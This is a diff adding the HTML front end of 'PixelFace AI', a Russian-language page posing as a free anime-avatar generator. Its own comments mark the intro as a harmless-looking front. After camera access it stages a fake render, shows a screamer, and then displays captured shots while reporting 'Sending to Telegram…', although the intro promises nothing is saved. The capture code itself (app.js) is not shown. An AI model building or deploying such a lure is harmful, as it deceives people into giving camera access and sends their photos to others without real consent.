@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#f6f3ff">
+<meta name="color-scheme" content="light dark">
+<meta name="robots" content="noindex, nofollow">
+<meta name="format-detection" content="telephone=no">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="apple-mobile-web-app-title" content="PixelFace AI">
+<title>PixelFace AI — аватарка из твоего фото</title>
+<link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="assets/apple-touch-icon.png">
+<link rel="manifest" href="manifest.webmanifest">
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<main id="app">
+
+  <!-- ==================== 1. ИНТРО: безобидный сервис ==================== -->
+  <section class="scene scene--intro is-active" id="scene-intro">
+    <header class="brandbar">
+      <span class="logo"><i class="logo__mark">◈</i>PixelFace <em>AI</em></span>
+      <span class="badge">beta</span>
+    </header>
+
+    <div class="intro">
+      <div class="card">
+        <p class="tag">нейросеть · аватарки</p>
+        <h1>Аватарка<br>из&nbsp;твоего фото</h1>
+        <p class="sub">
+          Нейросеть нарисует стикер в стиле аниме за 5 секунд.
+          Бесплатно, без регистрации и без фотошопа.
+        </p>
+
+        <div class="chips">
+          <span>⚡ 5 секунд</span>
+          <span>🎨 8 стилей</span>
+          <span>🔒 не сохраняем</span>
+        </div>
+
+        <button class="btn btn--primary" id="btn-start" type="button">
+          <span>СОЗДАТЬ АВАТАРКУ</span>
+          <i aria-hidden="true">→</i>
+        </button>
+
+        <p class="fineprint">понадобится камера · бесплатная демо-версия</p>
+
+        <p class="notice" id="secure-warn" hidden>
+          <b>iPhone:</b> камера работает только по <b>https://</b>. Сейчас страница
+          открыта небезопасно — аватарка не получится (см. README).
+        </p>
+      </div>
+
+      <div class="styles" aria-hidden="true">
+        <div class="style"><i style="--g1:#ffd1e8;--g2:#a78bfa"></i><span>anime</span></div>
+        <div class="style"><i style="--g1:#c8f7dc;--g2:#5eead4"></i><span>ghibli</span></div>
+        <div class="style"><i style="--g1:#c7d2fe;--g2:#818cf8"></i><span>cyber</span></div>
+        <div class="style"><i style="--g1:#fde68a;--g2:#fb923c"></i><span>3D</span></div>
+      </div>
+
+      <p class="fineprint fineprint--dim">демо · 18+ · сделано для друзей</p>
+    </div>
+  </section>
+
+  <!-- ==================== 2. СКАН: «рендер аватарки» ==================== -->
+  <section class="scene scene--scan" id="scene-scan" hidden>
+    <header class="renderbar">
+      <span class="renderbar__live"><i></i>AI-РЕНДЕР</span>
+      <span class="renderbar__timer" id="scan-timer">00:00</span>
+      <span class="renderbar__style">стиль: <b>anime</b></span>
+    </header>
+
+    <div class="canvas" id="viewfinder">
+      <video id="cam" playsinline autoplay muted></video>
+      <div class="canvas__off" id="nosignal">камера выключена</div>
+      <div class="canvas__hint" id="cam-hint"></div>
+      <div class="canvas__frame" aria-hidden="true"></div>
+      <div class="canvas__label">LIVE · предпросмотр</div>
+      <div class="canvas__scanline" aria-hidden="true"></div>
+    </div>
+
+    <div class="progress"><div class="progress__bar" id="scan-bar"></div></div>
+    <div class="progress__meta"><span id="scan-pct">0%</span><span id="scan-phase">ЗАГРУЗКА МОДЕЛИ</span></div>
+
+    <div class="scanlog" id="scan-log" aria-live="polite"></div>
+
+    <div class="metrics">
+      <div class="metric"><span>стиль</span><b id="m-style">anime</b></div>
+      <div class="metric"><span>слой</span><b id="m-layer">1/8</b></div>
+      <div class="metric"><span>качество</span><b id="m-quality">HD</b></div>
+    </div>
+
+    <div class="glitch" id="glitch" hidden>
+      <span id="glitch-text">ОШИБКА РЕНДЕРА</span>
+    </div>
+  </section>
+
+  <!-- ==================== 3. СКРИМЕР ==================== -->
+  <section class="scene scene--scare" id="scene-scare" hidden>
+    <div class="scare__wrap" id="scare-wrap">
+      <img class="scare__img" id="scare-img" src="assets/scare.jpg" alt="">
+      <div class="scare__text">Я ТЕБЯ ВИЖУ</div>
+    </div>
+    <div class="scare__flash" id="scare-flash"></div>
+  </section>
+
+  <!-- ==================== 4. ИТОГ ==================== -->
+  <section class="scene scene--result" id="scene-result" hidden>
+    <div class="result">
+      <p class="tag tag--danger">рендер завершён</p>
+      <h2>АВАТАРКА ГОТОВА<br><span class="red">И ОНА ЧЕСТНАЯ</span></h2>
+      <p class="sub sub--dark" id="result-lead">Нейросеть выбрала самый честный кадр.</p>
+
+      <div class="shots" id="shots"></div>
+
+      <div class="status" id="send-status" data-state="pending">
+        <i class="status__dot"></i><span id="send-status-text">Отправляю в Telegram…</span>
+      </div>
+
+      <div class="result__actions">
+        <button class="btn btn--ghost" id="btn-again" type="button">ЕЩЁ РАЗ</button>
+        <button class="btn btn--ghost" id="btn-retry" type="button" hidden>ОТПРАВИТЬ СНОВА</button>
+        <button class="btn btn--ghost" id="btn-download" type="button" hidden>СКАЧАТЬ</button>
+      </div>
+
+      <p class="fineprint fineprint--dim">если это был друг — он согласился на аватарку.</p>
+    </div>
+  </section>
+
+</main>
+
+<script src="app.js"></script>
+</body>
+</html>
